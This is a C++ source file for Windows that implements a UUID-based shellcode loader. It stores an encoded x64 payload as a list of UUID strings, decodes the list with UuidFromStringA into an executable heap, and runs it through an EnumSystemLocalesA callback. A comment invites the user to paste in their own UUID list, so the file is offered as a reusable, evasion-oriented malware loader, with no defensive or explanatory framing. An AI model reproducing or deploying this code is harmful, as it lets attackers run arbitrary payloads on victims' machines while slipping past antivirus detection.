#include <Windows.h>
#include <Rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] =
{
    //Paste your uuid_list.txt here
    "48c93148-e981-ffc0-ffff-488d05efffff",
    "54bb48ff-367e-1da3-16ea-2c4831582748",
    "fffff82d-e2ff-a8f4-36b5-47edfe262c54",
    "5cf2777e-b846-1c7d-4fe4-c6559db84c02",
    "05f1bd36-615e-747e-3307-6a559d987c1c",
    "57e98171-db5e-f8ec-4257-df1f3aca6d95",
    "1ce23bb7-08d7-06c1-36bd-f13d57bba716",
    "cda27e42-6b70-4c54-7534-ac9864ea2c54",
    "1d2bb6f5-ea16-d164-be42-c455173a68df",
    "1cea163e-bac6-1ca7-66d5-f555e9236165",
    "292877b7-a29e-822d-3607-635cd72321f8",
    "2562373f-9ff6-18dd-7d7a-871553d3fd21",
    "96e76ea6-ce56-5565-ae50-e2961aa268df",
    "1cea2a3e-abc6-50a7-f67e-a2cd57b26d0c",
    "5cf96f20-ab4e-1575-247e-20f136ab7eab",
    "44e26e9e-a24c-46a7-977d-5ce2e9b765ea",
    "42914509-d825-542c-3f60-ea94f0a2adb8",
    "1da337de-635f-1dc9-c234-a30c4a2a8455",
    "54f777ca-0e9f-dd60-8f77-195161cc2bab",
    "f72a7aab-eb7e-542d-7e6f-e2a73f6a4754",
    "17c9e381-b457-047c-3307-6a50272a64ab",
    "df2a7ebe-155e-1cec-f7f7-e2a7fce5f3b4",
    "94ebe381-80d1-153c-267a-2aff5e63d515",
    "6906afc4-1577-d1f9-be42-a954e92459b1",
    "1da3a596-a216-b8af-6e7e-2aff5bdbe53e",
    "55fb777a-139f-ee6d-7cef-6b42e93fafac",
    "55f6487e-2e95-0a0c-f7c0-c95d57b34454",
    "5ca3366e-a24e-a6a5-3607-6a5cacb28807",
    "5576c99b-299f-dd65-b97b-92d45f63dc1c",
    "94ebecf7-abef-5696-a7fe-fce2c369d454",
    "5cfb1e03-b341-5444-3e36-a35c4e802c0e",
    "32a88c3f-da19-81d3-296f-e2a763846135",
    "e2eae381-03d8-ab10-81c9-eb1cd5a20592",
    "6855b336-aba2-b3d3-265c-a3445f2deea4",
    "e2f594cb-eac3-002c-0000-000000000000",

};

int main()
{
    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status == RPC_S_OK) {
            printf("uuid: %s | GOOD \n", uuids[i]);
        }
        else
        {
            printf("uuid: %s | BAD \n", uuids[i]);
            CloseHandle(ha);
            return -1;
        }
        hptr += 16;
    }
    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(ha);
    return 0;
}

